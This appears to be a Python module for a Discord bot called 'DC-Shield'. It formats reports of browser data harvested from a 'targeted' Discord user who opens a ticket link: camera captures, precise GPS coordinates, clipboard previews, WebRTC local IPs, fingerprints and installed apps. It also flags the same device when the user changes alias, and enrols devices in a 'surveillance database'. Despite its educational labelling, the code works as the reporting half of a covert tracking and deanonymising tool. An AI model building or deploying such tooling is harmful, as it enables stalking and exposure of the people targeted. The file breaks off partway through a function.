"""
Educational Discord Embed Functions for DC-Shield
Provides cybersecurity awareness demonstrations with educational context and learning objectives
Educational tool for demonstrating web vulnerabilities and privacy implications
"""

import re


# ANSI Color Codes for Discord
class AnsiColor:
    """ANSI color formatting for Discord code blocks"""
    # Format codes
    RESET = "[0m"
    BOLD = "[1m"
    UNDERLINE = "[4m"

    # Text colors
    GRAY = "[30m"
    RED = "[31m"
    GREEN = "[32m"
    YELLOW = "[33m"
    BLUE = "[34m"
    PINK = "[35m"
    CYAN = "[36m"
    WHITE = "[37m"

    # Background colors
    BG_DARK_BLUE = "[40m"
    BG_ORANGE = "[41m"
    BG_MARBLE_BLUE = "[42m"
    BG_TURQUOISE = "[43m"
    BG_GRAY = "[44m"
    BG_INDIGO = "[45m"
    BG_LIGHT_GRAY = "[46m"
    BG_WHITE = "[47m"


_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")


def ansi_format(text, color=None, bold=False, underline=False, bg_color=None):
    """Format text with ANSI color codes for Discord code blocks."""
    codes = []

    if bg_color:
        codes.append(bg_color)
    if bold:
        codes.append(AnsiColor.BOLD)
    if underline:
        codes.append(AnsiColor.UNDERLINE)
    if color:
        codes.append(color)

    if codes:
        return "".join(codes) + text + AnsiColor.RESET
    return text


def strip_ansi(text):
    """Remove ANSI escape codes from a string."""
    return _ANSI_RE.sub("", text or "")


def create_progress_bar(percentage, length=10):
    """Create a visual progress bar using Discord-compatible characters with color coding."""
    filled = int(length * percentage / 100)
    empty = length - filled

    # Color code based on threat level
    if percentage >= 80:
        bar_color = AnsiColor.RED
    elif percentage >= 60:
        bar_color = AnsiColor.YELLOW
    elif percentage >= 40:
        bar_color = AnsiColor.CYAN
    else:
        bar_color = AnsiColor.GREEN

    filled_bar = ansi_format("█" * filled, color=bar_color, bold=True)
    empty_bar = ansi_format("░" * empty, color=AnsiColor.GRAY)
    percentage_text = ansi_format(f" {percentage}%", color=bar_color, bold=True)

    return filled_bar + empty_bar + percentage_text


def format_bytes(bytes_value):
    """Format bytes into human readable format."""
    if not bytes_value or bytes_value == 0:
        return "0 B"

    for unit in ["B", "KB", "MB", "GB", "TB"]:
        if bytes_value < 1024.0:
            return f"{bytes_value:.1f} {unit}"
        bytes_value /= 1024.0
    return f"{bytes_value:.1f} PB"


def get_threat_indicator(score):
    """Return (ansi_label, embed_color) for the given exposure score."""
    if score >= 80:
        return ansi_format("⚠️ CRITICAL_THREAT", color=AnsiColor.RED, bold=True), 0xFF0000
    if score >= 60:
        return ansi_format("⚡ HIGH_RISK", color=AnsiColor.YELLOW, bold=True), 0xFF4500
    if score >= 40:
        return ansi_format("⚙️ MODERATE_ALERT", color=AnsiColor.CYAN, bold=True), 0xFFFF00
    if score >= 20:
        return ansi_format("✓ LOW_EXPOSURE", color=AnsiColor.GREEN, bold=True), 0x00FF00
    return ansi_format("○ MINIMAL_TRACE", color=AnsiColor.GREEN), 0x00AA00


def _threat_emoji(label_plain):
    """Map a plain threat label to a leading emoji."""
    if "CRITICAL" in label_plain:
        return "🔴"
    if "HIGH" in label_plain:
        return "🟠"
    if "MODERATE" in label_plain:
        return "🟡"
    if "LOW" in label_plain:
        return "🟢"
    return "⚪"


def get_security_lesson(vulnerability_type):
    """Get educational content about specific vulnerabilities."""
    lessons = {
        "geolocation": {
            "title": "📍 Geolocation Privacy",
            "lesson": "Websites can request your precise GPS location through browser APIs. Always deny location access unless absolutely necessary.",
            "protection": "• Disable location services\n• Use VPN for IP masking\n• Check browser permissions regularly",
            "reference": "OWASP: Information Disclosure",
        },
        "fingerprinting": {
            "title": "🔍 Browser Fingerprinting",
            "lesson": "Your browser reveals unique characteristics that can track you across sites without cookies.",
            "protection": "• Use Tor Browser or Firefox with resistFingerprinting\n• Disable WebGL and Canvas\n• Use browser extensions like Canvas Blocker",
            "reference": "EFF Panopticlick Study",
        },
        "camera": {
            "title": "📸 Camera/Microphone Access",
            "lesson": "Malicious sites can attempt to access your camera and microphone through getUserMedia API.",
            "protection": "• Always check permission prompts carefully\n• Revoke unused permissions\n• Cover cameras when not in use",
            "reference": "CVE-2019-11730: Firefox Camera Vulnerability",
        },
        "vpn_detection": {
            "title": "🛡️ VPN Detection",
            "lesson": "Websites can detect VPN usage through IP analysis and WebRTC leaks.",
            "protection": "• Use quality VPN providers\n• Disable WebRTC in browser\n• Check for DNS leaks regularly",
            "reference": "WebRTC IP Leak Vulnerability",
        },
        "clipboard": {
            "title": "📋 Clipboard Access",
            "lesson": "Modern browsers can access clipboard contents, potentially exposing passwords or sensitive data.",
            "protection": "• Clear clipboard after copying sensitive data\n• Use password managers\n• Be cautious with clipboard permissions",
            "reference": "Clipboard API Security Concerns",
        },
    }
    return lessons.get(
        vulnerability_type,
        {
            "title": "🔒 General Security",
            "lesson": "Understanding web vulnerabilities helps protect your privacy.",
            "protection": "• Keep browsers updated\n• Use privacy extensions\n• Review permissions regularly",
            "reference": "OWASP Web Security Guidelines",
        },
    )


def _is_valid_dict(obj):
    return isinstance(obj, dict) and not obj.get("error")


def _safe_handle(dc_handle):
    """Strip a single trailing '?' the ticket route appends and clamp length for display."""
    if not dc_handle:
        return "Anonymous"
    cleaned = str(dc_handle).rstrip("?").strip() or "Anonymous"
    return cleaned[:64]


def create_combined_surveillance_embed(data, recognition_info=None, dc_handle=None):
    """
    Create a Discord embed summarizing collected browser data.

    Args:
        data: Collected browser fingerprinting data
        recognition_info: Optional device recognition information from device_tracker
        dc_handle: Ticket ID from /ticket/{ID} (the targeted Discord handle)
    """
    from datetime import datetime

    target = _safe_handle(dc_handle)

    # ---- Tally captured categories ----
    captured_categories = []
    critical_data_found = False

    def add(name, *, critical=False):
        captured_categories.append(name)
        return critical

    if data.get("screen"):
        add("Display")
    if _is_valid_dict(data.get("geolocation")):
        critical_data_found = add("GPS Location", critical=True) or critical_data_found
    if data.get("camera", {}).get("captured"):
        critical_data_found = add("Camera Access", critical=True) or critical_data_found
    if _is_valid_dict(data.get("battery")):
        add("Battery")
    media = data.get("mediaDevices")
    if isinstance(media, list) or (isinstance(media, dict) and not media.get("error") and media):
        add("Media Devices")
    if _is_valid_dict(data.get("network")):
        add("Network")
    if _is_valid_dict(data.get("storage")):
        add("Storage")
    if _is_valid_dict(data.get("clipboard")):
        critical_data_found = add("Clipboard", critical=True) or critical_data_found
    if data.get("canvas"):
        add("Canvas Fingerprint")
    if _is_valid_dict(data.get("webgl")):
        add("WebGL Fingerprint")
    if data.get("memory"):
        add("Memory Profile")
    if data.get("timezone"):
        add("Timezone")
    if data.get("viewport"):
        add("Viewport")
    if data.get("browser"):
        add("Browser Profile")
    if data.get("localStorage"):
        add("Local Storage")
    if _is_valid_dict(data.get("audioFingerprint")):
        critical_data_found = add("Audio Fingerprint", critical=True) or critical_data_found
    if data.get("fonts") and not data.get("fonts", {}).get("error"):
        add("Font Detection")
    if data.get("webrtc") and data["webrtc"].get("leakDetected"):
        critical_data_found = add("WebRTC Leak", critical=True) or critical_data_found
    if data.get("browserFeatures"):
        add("Browser Features")
    if data.get("behavioral"):
        add("Behavioral Tracking")
    if data.get("sensors") and len(data.get("sensors", {})) > 0:
        add("Hardware Sensors")
    if data.get("cpuBenchmark"):
        add("CPU Benchmark")
    if _is_valid_dict(data.get("uaClientHints")):
        add("UA-CH High Entropy")
    if _is_valid_dict(data.get("permissions")):
        # Granted permissions count as critical exposure
        granted = sum(
            1 for v in data["permissions"].values() if v == "granted"
        )
        if granted:
            critical_data_found = add("Permissions Granted", critical=True) or critical_data_found
        else:
            add("Permissions Probe")
    if _is_valid_dict(data.get("webgpu")):
        add("WebGPU Adapter")
    if _is_valid_dict(data.get("speechVoices")):
        add("Speech Voices")
    if _is_valid_dict(data.get("keyboardLayout")):
        add("Keyboard Layout")
    if _is_valid_dict(data.get("installedApps")) and data["installedApps"].get("count", 0) > 0:
        critical_data_found = add("Installed Apps", critical=True) or critical_data_found
    if data.get("screenDetails"):
        add("Screen Details")
    if _is_valid_dict(data.get("drm")):
        add("DRM/Codecs")
    if _is_valid_dict(data.get("mediaQueries")):
        add("Display Capabilities")
    if _is_valid_dict(data.get("navigationTiming")):
        add("Navigation Timing")
    if data.get("hardeningSignals"):
        add("Hardening Posture")
    if isinstance(data.get("_serverTransport"), dict) and data["_serverTransport"]:
        add("Transport Profile")
    if isinstance(data.get("_serverCveMatches"), dict) and data["_serverCveMatches"].get("count", 0) > 0:
        critical_data_found = add("CVE Exposure", critical=True) or critical_data_found

    total_categories = 36
    categories_captured = len(captured_categories)
    success_rate = int((categories_captured / total_categories) * 100)
    threat_label_ansi, embed_color = get_threat_indicator(success_rate)
    threat_label_plain = strip_ansi(threat_label_ansi)
    threat_emoji = _threat_emoji(threat_label_plain)

    # ---- Description: clean markdown, no ANSI noise ----
    status_line = (
        "🚨 **Critical vulnerabilities detected**"
        if critical_data_found
        else "✅ Standard profiling executed"
    )
    description_lines = [
        f"**Ticket:** `{target}`",
        f"**Threat Level:** {threat_emoji} `{threat_label_plain}`",
        f"**Data Exposure:** `{categories_captured}/{total_categories}` vectors compromised",
        status_line,
        "",
        "_Educational demonstration · authorized training environment._",
    ]

    embed = {
        "title": f"🎯 SURVEILLANCE PROTOCOL — Ticket: {target}",
        "description": "\n".join(description_lines),
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": (
                f"Ticket {target} • {categories_captured}/{total_categories} vectors "
                f"• DC-Shield Educational Tool"
            ),
            "icon_url": "https://cdn.discordapp.com/attachments/123456789/shield-icon.png",
        },
    }

    # ---- Harvest efficiency (with ANSI progress bar) ----
    overview_lines = [
        f"Efficiency  {create_progress_bar(success_rate)}",
        f"Vectors     {ansi_format(f'{categories_captured}/{total_categories}', color=AnsiColor.YELLOW, bold=True)}",
        f"Threat      {threat_label_ansi}",
    ]
    embed["fields"].append(
        {
            "name": "📊 BREACH OVERVIEW",
            "value": "```ansi\n" + "\n".join(overview_lines) + "\n```",
            "inline": False,
        }
    )

    # ---- Device recognition ----
    if recognition_info:
        embed["fields"].append(_build_recognition_field(recognition_info))

    # ---- Critical exploits ----
    critical_alerts = _build_critical_alerts(data)
    if critical_alerts:
        embed["fields"].append(
            {
                "name": "⚠️ CRITICAL EXPLOITS SUCCESSFUL",
                "value": "\n\n".join(critical_alerts),
                "inline": False,
            }
        )

    # ---- Hardware / Network (two inline columns) ----
    hardware_lines, network_lines = _build_system_profile(data)
    if hardware_lines:
        embed["fields"].append(
            {
                "name": "🖥️ HARDWARE_PROFILE",
                "value": "\n".join(hardware_lines),
                "inline": True,
            }
        )
    if network_lines:
        embed["fields"].append(
            {
                "name": "📡 NETWORK_INTEL",
                "value": "\n".join(network_lines),
                "inline": True,
            }
        )

    # ---- Advanced fingerprinting ----
    advanced = _build_advanced_fingerprinting(data)
    if advanced:
        embed["fields"].append(
            {
                "name": "🔬 ADVANCED_FINGERPRINTING",
                "value": "\n\n".join(advanced),
                "inline": False,
            }
        )

    # ---- UA Client Hints / Browser identity ----
    ua_field = _build_ua_client_hints_field(data)
    if ua_field:
        embed["fields"].append(ua_field)

    # ---- Permissions API state probe ----
    perms_field = _build_permissions_field(data)
    if perms_field:
        embed["fields"].append(perms_field)

    # ---- Hardware acceleration / WebGPU + DRM ----
    accel_field = _build_acceleration_field(data)
    if accel_field:
        embed["fields"].append(accel_field)

    # ---- Display & input capabilities (matchMedia + screen details + keyboard) ----
    caps_field = _build_capabilities_field(data)
    if caps_field:
        embed["fields"].append(caps_field)

    # ---- Voices / installed apps (high-signal OS leaks) ----
    leaks_field = _build_os_leaks_field(data)
    if leaks_field:
        embed["fields"].append(leaks_field)

    # ---- Browser hardening posture ----
    hardening_field = _build_hardening_field(data)
    if hardening_field:
        embed["fields"].append(hardening_field)

    # ---- Server-side transport profile ----
    transport_field = _build_transport_field(data)
    if transport_field:
        embed["fields"].append(transport_field)

    # ---- Server-side CVE match ----
    cve_field = _build_cve_field(data)
    if cve_field:
        embed["fields"].append(cve_field)

    # ---- Risk assessment ----
    embed["fields"].append(_build_risk_assessment(data))

    # ---- Captured vectors summary ----
    if captured_categories:
        chunks = [
            ", ".join(captured_categories[i : i + 4])
            for i in range(0, len(captured_categories), 4)
        ]
        summary_value = (
            f"**{len(captured_categories)} categories acquired:**\n"
            + "\n".join(f"• {chunk}" for chunk in chunks)
        )
        embed["fields"].append(
            {
                "name": "📌 Captured Vectors",
                "value": summary_value,
                "inline": False,
            }
        )

    # ---- Training objectives ----
    embed["fields"].append(
        {
            "name": "🎓 TRAINING_OBJECTIVES",
            "value": (
                "**EDUCATIONAL_OBJECTIVES**\n"
                "• Demonstrate ease of data harvesting\n"
                "• Expose browser information disclosure\n"
                "• Emphasize need for privacy tools\n\n"
                "**Defensive resources**\n"
                "• [Privacy Tools](https://www.privacytools.io/)\n"
                "• [EFF Defense Guide](https://ssd.eff.org/)\n"
                "• [Cover Your Tracks](https://coveryourtracks.eff.org/)"
            ),
            "inline": False,
        }
    )

    return embed


def _build_recognition_field(recognition_info):
    """Build the device recognition field. Names preserved for downstream test assertions."""
    if not recognition_info.get("is_returning"):
        # New device
        fingerprint = recognition_info.get("fingerprint") or "Unknown"
        value = (
            f"🆕 **New target acquired**\n"
            f"**Alias:** `{recognition_info.get('current_name', 'Unknown')}`\n"
            f"**Fingerprint:** `{fingerprint[:32]}…`\n"
            f"_Device enrolled in surveillance database._"
        )
        return {
            "name": "✨ NEW DEVICE FINGERPRINTED",
            "value": value,
            "inline": False,
        }

    visit_count = recognition_info.get("visit_count", 0)
    first_seen = (recognition_info.get("first_seen") or "Unknown")[:16]
    last_seen = (recognition_info.get("last_seen") or "Unknown")[:16]
    fingerprint = (recognition_info.get("fingerprint") or "Unknown")[:32]
    current = recognition_info.get("current_name", "Unknown")

    if recognition_info.get("is_new_name"):
        previous_names = recognition_info.get("previous_names", []) or []
        prev_list = (
            "\n".join(f"• `{name}`" for name in previous_names[-5:])
            or "• _(none recorded)_"
        )
        value = (
            f"🚨 **Identity SPOOFING attempt — same device, new alias.**\n"
            f"**Current alias:** `{current}`\n"
            f"**Previous identities ({len(previous_names)}):**\n{prev_list}\n\n"
            f"**Visits:** `{visit_count}` · **First:** `{first_seen}` · **Last:** `{last_seen}`\n"
            f"**Device hash:** `{fingerprint}…`\n"
            f"_Persistent fingerprinting defeats username changes._"
        )
        return {
            "name": "🚨 IDENTITY SPOOFING DETECTED",
            "value": value,
            "inline": False,
        }

    previous_ips = recognition_info.get("previous_ips", []) or []
    ip_trail = ""
    if len(previous_ips) > 1:
        ip_trail = "\n**IP trail:** " + ", ".join(f"`{ip}`" for ip in previous_ips[-5:])

    value = (
        f"♻️ **Returning device · fingerprint matched.**\n"
        f"**Target:** `{current}`\n"
        f"**Visits:** `{visit_count}` · **First:** `{first_seen}` · **Last:** `{last_seen}`"
        f"{ip_trail}\n"
        f"**Device hash:** `{fingerprint}…`"
    )
    return {
        "name": "♻️ RETURNING DEVICE TRACKED",
        "value": value,
        "inline": False,
    }


def _build_critical_alerts(data):
    """Build the critical exploits list. Keywords preserved: CAMERA, LOCATION, CLIPBOARD, WEBRTC, AUDIO FINGERPRINT."""
    alerts = []

    if data.get("camera", {}).get("captured"):
        timestamp = data["camera"].get("timestamp", "Unknown")
        alerts.append(
            f"📸 **CAMERA compromised**\n"
            f"└ Captured at `{timestamp}` (640×480 JPEG)"
        )

    if _is_valid_dict(data.get("geolocation")) and data["geolocation"].get("latitude") is not None:
        lat = data["geolocation"].get("latitude")
        lng = data["geolocation"].get("longitude")
        accuracy = data["geolocation"].get("accuracy", "?")
        alerts.append(
            f"🌍 **Precise LOCATION acquired**\n"
            f"└ `{lat:.6f}, {lng:.6f}` (±{accuracy}m)"
        )

    if _is_valid_dict(data.get("clipboard")):
        clip_len = data["clipboard"].get("length", 0)
        preview = (data["clipboard"].get("content", "") or "")[:30]
        alerts.append(
            f"📋 **CLIPBOARD intercepted**\n"
            f"└ {clip_len} chars · preview: `{preview}…`"
        )

    media = data.get("mediaDevices")
    if isinstance(media, list):
        cam = sum(1 for d in media if isinstance(d, dict) and d.get("kind") == "videoinput")
        mic = sum(1 for d in media if isinstance(d, dict) and d.get("kind") == "audioinput")
        spk = sum(1 for d in media if isinstance(d, dict) and d.get("kind") == "audiooutput")
        alerts.append(
            f"🎥 **Media devices enumerated**\n"
            f"└ Cameras: {cam} · Microphones: {mic} · Speakers: {spk}"
        )

    if data.get("webrtc") and data["webrtc"].get("leakDetected"):
        local_ips = data["webrtc"].get("localIPs", []) or []
        ip_str = ", ".join(f"`{ip}`" for ip in local_ips) if local_ips else "_unknown_"
        alerts.append(
            f"🔓 **WEBRTC IP leak detected**\n"
            f"└ Local IPs: {ip_str} (VPN bypass possible)"
        )

    if _is_valid_dict(data.get("audioFingerprint")):
        audio_hash = (data["audioFingerprint"].get("hash", "") or "unknown")[:16]
        alerts.append(
            f"🔊 **AUDIO FINGERPRINT captured**\n"
            f"└ Hardware ID: `{audio_hash}…` (cross-browser tracking)"
        )

    perms = data.get("permissions") or {}
    if _is_valid_dict(perms):
        granted = [k for k, v in perms.items() if v == "granted"]
        if granted:
            alerts.append(
                f"🔐 **Permissions granted without prompt**\n"
                f"└ {', '.join(f'`{p}`' for p in granted[:8])}"
            )

    apps = data.get("installedApps") or {}
    if _is_valid_dict(apps) and apps.get("count", 0) > 0:
        sample = ", ".join(
            f"`{a.get('id') or a.get('platform') or '?'}`"
            for a in (apps.get("apps") or [])[:5]
        )
        alerts.append(
            f"📦 **Installed apps disclosed**\n"
            f"└ {apps.get('count', 0)} related apps: {sample or '_unknown_'}"
        )

    cve = data.get("_serverCveMatches") or {}
    if isinstance(cve, dict) and cve.get("count", 0) > 0:
        alerts.append(
            f"🦠 **CVE EXPOSURE — outdated browser**\n"
            f"└ `{cve['count']}` known CVE(s) · max CVSS `{cve.get('max_cvss', 0):.1f}`"
        )

    return alerts


def _build_system_profile(data):
    """Return (hardware_lines, network_lines) for the inline profile fields."""
    hardware = []
    network = []

    if data.get("screen"):
        screen = data["screen"]
        total_pixels = (screen.get("width", 0) or 0) * (screen.get("height", 0) or 0)
        hardware.append(
            f"🖥️ **Display**\n"
            f"`{screen.get('width', '?')}×{screen.get('height', '?')}` "
            f"({total_pixels:,} px) · {screen.get('colorDepth', '?')}-bit"
        )

    if data.get("browser", {}).get("hardwareConcurrency"):
        hardware.append(f"⚙️ **CPU**\n`{data['browser']['hardwareConcurrency']} cores`")

    if data.get("deviceMemory"):
        hardware.append(f"💾 **RAM**\n`{data['deviceMemory']} GB`")

    if data.get("memory"):
        memory = data["memory"]
        heap_used = format_bytes(memory.get("usedJSHeapSize", 0))
        heap_limit = format_bytes(memory.get("jsHeapSizeLimit", 0))
        hardware.append(f"🧠 **JS Heap**\n`{heap_used}` / `{heap_limit}`")

    if _is_valid_dict(data.get("battery")):
        battery = data["battery"]
        level = int((battery.get("level", 0) or 0) * 100)
        status = "🔌 charging" if battery.get("charging") else "🔋 discharging"
        hardware.append(f"🔋 **Battery**\n`{level}%` · {status}")

    if data.get("timezone"):
        tz = data["timezone"]
        offset_hours = (tz.get("offset", 0) or 0) / -60
        network.append(
            f"🌐 **Timezone**\n`{tz.get('name', 'Unknown')}` (UTC{offset_hours:+.1f})"
        )

    if _is_valid_dict(data.get("network")):
        net = data["network"]
        speed = f"{net.get('downlink', '?')} Mbps"
        rtt = f"{net.get('rtt', '?')} ms"
        network.append(
            f"📡 **Connection**\n`{net.get('effectiveType', '?')}` · {speed} · {rtt}"
        )

    if data.get("viewport"):
        vp = data["viewport"]
        if isinstance(vp, dict) and (vp.get("width") or vp.get("height")):
            network.append(
                f"📐 **Viewport**\n"
                f"`{vp.get('width', '?')}×{vp.get('height', '?')}`"
            )

    return hardware, network


def _build_advanced_fingerprinting(data):
    """Build advanced fingerprinting bullets. Preserves keywords 'Font' and 'Behavioral'."""
    items = []

    fonts = data.get("fonts")
    if fonts and not (isinstance(fonts, dict) and fonts.get("error")):
        font_count = fonts.get("count", 0) if isinstance(fonts, dict) else 0
        installed = (fonts.get("installed", []) if isinstance(fonts, dict) else [])[:5]
        sample = ", ".join(installed) if installed else "_no sample_"
        items.append(
            f"🔤 **Font fingerprinting**\n"
            f"└ `{font_count}` unique fonts · sample: {sample}"
        )

    if data.get("cpuBenchmark"):
        cpu = data["cpuBenchmark"]
        score = cpu.get("score", 0)
        duration = cpu.get("duration", 0) or 0
        items.append(
            f"⚡ **CPU benchmark**\n"
            f"└ Score `{score}` · {duration:.2f} ms"
        )

    if data.get("behavioral"):
        beh = data["behavioral"]
        moves = len(beh.get("mouseMovements", []) or [])
        visible = beh.get("pageVisible", False)
        items.append(
            f"🖱️ **Behavioral tracking**\n"
            f"└ Mouse events `{moves}` · page {'visible' if visible else 'hidden'}"
        )

    sensors = data.get("sensors")
    if sensors:
        active = [
            k for k, v in sensors.items()
            if not (isinstance(v, dict) and v.get("error"))
        ]
        if active:
            items.append(
                f"📱 **Hardware sensors**\n"
                f"└ Active: {', '.join(f'`{s}`' for s in active)}"
            )

    return items


def _build_risk_assessment(data):
    """Compute and render the risk assessment field."""
    score = 0
    risk_factors = []

    if data.get("camera", {}).get("captured"):
        score += 35
        risk_factors.append("Camera access granted")
    if _is_valid_dict(data.get("geolocation")) and data["geolocation"].get("latitude") is not None:
        score += 30
        risk_factors.append("GPS location exposed")
    if _is_valid_dict(data.get("clipboard")):
        score += 25
        risk_factors.append("Clipboard data accessed")

    media = data.get("mediaDevices")
    if isinstance(media, list) or (isinstance(media, dict) and not media.get("error") and media):
        score += 20
        risk_factors.append("Media devices enumerated")

    if data.get("canvas") or _is_valid_dict(data.get("webgl")):
        score += 15
        risk_factors.append("Device fingerprinting active")

    if _is_valid_dict(data.get("storage")):
        score += 10
        risk_factors.append("Storage information gathered")

    if _is_valid_dict(data.get("audioFingerprint")):
        score += 15
        risk_factors.append("Audio fingerprint captured")

    if data.get("webrtc") and data["webrtc"].get("leakDetected"):
        score += 25
        risk_factors.append("WebRTC IP leak detected")

    if data.get("fonts") and data.get("fonts", {}).get("count", 0) > 10:
        score += 10
        risk_factors.append("Extensive font fingerprinting")

    if data.get("behavioral") and data.get("behavioral", {}).get("mouseMovements"):
        score += 15
        risk_factors.append("Behavioral tracking active")

    if data.get("sensors") and len(data.get("sensors", {})) > 0:
        score += 20
        risk_factors.append("Hardware sensors accessed")

    perms = data.get("permissions") or {}
    if _is_valid_dict(perms):
        granted = sum(1 for v in perms.values() if v == "granted")
        if granted:
            score += 10 + min(granted, 5) * 3
            risk_factors.append(f"{granted} permission(s) pre-granted")

    if _is_valid_dict(data.get("uaClientHints")):
        score += 5
        risk_factors.append("UA-CH high-entropy disclosure")

    if _is_valid_dict(data.get("webgpu")):
        score += 5
        risk_factors.append("WebGPU adapter exposed")

    if _is_valid_dict(data.get("speechVoices")) and data["speechVoices"].get("count", 0):
        score += 5
        risk_factors.append("Installed voices leaked")

    if _is_valid_dict(data.get("keyboardLayout")):
        score += 5
        risk_factors.append("Keyboard layout disclosed")

    if _is_valid_dict(data.get("installedApps")) and data["installedApps"].get("count", 0):
        score += 15
        risk_factors.append("Installed apps disclosed")

    sd = data.get("screenDetails") or {}
    if isinstance(sd, dict) and sd.get("isExtended"):
        score += 5
        risk_factors.append("Multi-monitor setup disclosed")

    hard = data.get("hardeningSignals") or {}
    if isinstance(hard, dict):
        if hard.get("sharedArrayBuffer") is False or hard.get("crossOriginIsolated") is False:
            score += 5
            risk_factors.append("Spectre mitigations not active")

    cve = data.get("_serverCveMatches") or {}
    if isinstance(cve, dict) and cve.get("count", 0):
        score += min(int(cve.get("max_cvss", 0) * 3), 30)
        risk_factors.append(
            f"Outdated browser ({cve['count']} CVE, CVSS {cve.get('max_cvss', 0):.1f})"
        )

    score = min(score, 100)
    risk_label_ansi, _ = get_threat_indicator(score)
    risk_label_plain = strip_ansi(risk_label_ansi)
    emoji = _threat_emoji(risk_label_plain)

    bar_block = f"```ansi\n{create_progress_bar(score)}\n```"
    primary = (
        "\n".join(f"• {f}" for f in risk_factors[:3])
        if risk_factors
        else "• _No notable risk factors._"
    )

    value = (
        f"**Score:** `{score}/100` · {emoji} `{risk_label_plain}`\n"
        f"{bar_block}\n"
        f"**Risk factors:** `{len(risk_factors)} identified`\n"
        f"**Primary concerns:**\n{primary}"
    )

    return {
        "name": "🛡️ RISK_ASSESSMENT",
        "value": value,
        "inline": False,
    }


def _build_ua_client_hints_field(data):
    ua = data.get("uaClientHints")
    if not _is_valid_dict(ua):
        return None
    brands = ua.get("brands") or []
    brand_str = ", ".join(
        f"{b.get('brand')} {b.get('version')}".strip()
        for b in brands
        if isinstance(b, dict)
    ) or "_unknown_"

    full_list = ua.get("fullVersionList") or []
    full_str = ", ".join(
        f"{b.get('brand')} `{b.get('version')}`"
        for b in full_list
        if isinstance(b, dict)
    ) or "_n/a_"

    lines = [
        f"**Brands:** {brand_str}",
        f"**Full versions:** {full_str}",
        (
            f"**Platform:** `{ua.get('platform', '?')} {ua.get('platformVersion', '')}`".strip()
        ),
    ]
    if ua.get("architecture") or ua.get("bitness"):
        lines.append(
            f"**Arch:** `{ua.get('architecture', '?')}` · "
            f"**Bitness:** `{ua.get('bitness', '?')}`"
        )
    if ua.get("model"):
        lines.append(f"**Model:** `{ua.get('model')}`")
    lines.append(
        f"**Mobile:** {ua.get('mobile', False)} · "
        f"**Form factor:** `{ua.get('formFactor') or '—'}`"
    )
    return {
        "name": "🪪 UA-CH High Entropy",
        "value": "\n".join(lines),
        "inline": False,
    }


def _build_permissions_field(data):
    perms = data.get("permissions")
    if not _is_valid_dict(perms):
        return None

    icons = {"granted": "✅", "prompt": "❓", "denied": "⛔"}
    granted = sorted([k for k, v in perms.items() if v == "granted"])
    prompt = sorted([k for k, v in perms.items() if v == "prompt"])
    denied = sorted([k for k, v in perms.items() if v == "denied"])

    def fmt(group, label, key):
        if not group:
            return f"{icons[key]} **{label}:** _none_"
        return f"{icons[key]} **{label}:** " + ", ".join(f"`{p}`" for p in group)

    lines = [
        fmt(granted, "Granted", "granted"),
        fmt(prompt, "Promptable", "prompt"),
        fmt(denied, "Denied", "denied"),
    ]
    return {
        "name": "🔐 Permissions State",
        "value": "\n".join(lines),
        "inline": False,
    }


def _build_acceleration_field(data):
    """WebGPU adapter + DRM/codecs combined into one block."""
    parts = []
    gpu = data.get("webgpu")
    if _is_valid_dict(gpu):
        parts.append(
            "🎮 **WebGPU adapter**\n"
            f"└ Vendor: `{gpu.get('vendor', '?')}` · "
            f"Arch: `{gpu.get('architecture', '?')}` · "
            f"Device: `{gpu.get('device', '?')}`"
        )

    drm = data.get("drm")
    if _is_valid_dict(drm):
        ks = drm.get("keySystems") or {}
        active = [name for name, ok in ks.items() if ok]
        codecs = drm.get("codecs") or {}
        active_codecs = [c for c, ok in codecs.items() if ok]
        parts.append(
            "📼 **DRM / Codecs**\n"
            f"└ Key systems: {', '.join(f'`{a}`' for a in active) or '_none_'}\n"
            f"└ Codecs supported: {len(active_codecs)}/{len(codecs) or '?'}"
        )

    if not parts:
        return None
    return {
        "name": "🚀 Hardware Acceleration",
        "value": "\n\n".join(parts),
        "inline": False,
    }


def _build_capabilities_field(data):
    """matchMedia probes + screen details + keyboard layout."""
    parts = []

    mq = data.get("mediaQueries")
    if _is_valid_dict(mq):
        active = [k for k, v in mq.items() if v is True]
        if active:
            parts.append(
                "🖼️ **Display capabilities**\n└ "
                + ", ".join(f"`{k}`" for k in active[:10])
            )

    sd = data.get("screenDetails") or {}
    if isinstance(sd, dict) and not sd.get("error"):
        screens = sd.get("screens") or []
        if screens:
            primary = next((s for s in screens if s.get("isPrimary")), screens[0])
            parts.append(
                "🖥️ **Multi-monitor**\n"
                f"└ {len(screens)} screen(s) · "
                f"primary `{primary.get('width', '?')}×{primary.get('height', '?')}` "
                f"@ DPR `{primary.get('devicePixelRatio', '?')}`"
            )
        elif sd.get("isExtended") is not None:
            parts.append(
                f"🖥️ **Multi-monitor**\n└ Extended desktop: `{bool(sd.get('isExtended'))}`"
            )

    kb = data.get("keyboardLayout")
    if _is_valid_dict(kb):
        sample = kb.get("sample") or {}
        sample_str = ", ".join(f"`{k}→{v}`" for k, v in list(sample.items())[:4])
        parts.append(
            f"⌨️ **Keyboard layout**\n└ {kb.get('size', '?')} keys mapped · {sample_str or '_no sample_'}"
        )

    if not parts:
        return None
    return {
        "name": "🧭 Display & Input Capabilities",
        "value": "\n\n".join(parts),
        "inline": False,
    }


def _build_os_leaks_field(data):
    """Speech voices + installed apps — both leak OS/locale/identity."""
    parts = []

    voices = data.get("speechVoices")
    if _is_valid_dict(voices) and voices.get("count", 0):
        sample = voices.get("sample") or []
        sample_str = ", ".join(
            f"`{v.get('name', '?').split(' ')[0]} ({v.get('lang', '?')})`"
            for v in sample[:5]
        )
        parts.append(
            f"🗣️ **Speech voices**\n└ {voices.get('count')} installed · {sample_str}"
        )

    apps = data.get("installedApps")
    if _is_valid_dict(apps) and apps.get("count", 0):
        items = ", ".join(
            f"`{a.get('id') or a.get('platform') or '?'}`"
            for a in (apps.get("apps") or [])[:5]
        )
        parts.append(
            f"📦 **Installed apps**\n└ {apps.get('count')} found · {items}"
        )

    if not parts:
        return None
    return {
        "name": "🕵️ OS-Level Leaks",
        "value": "\n\n".join(parts),
        "inline": False,
    }


def _build_hardening_field(data):
    """Spectre/site isolation health and security context."""
    h = data.get("hardeningSignals")
    if not isinstance(h, dict) or not h or h.get("error"):
        return None

    def mark(value, on_label="enabled", off_label="missing"):
        if value is True:
            return f"✅ {on_label}"
        if value is False:
            return f"⚠️ {off_label}"
        return "—"

    lines = [
        f"**SharedArrayBuffer:** {mark(h.get('sharedArrayBuffer'))}",
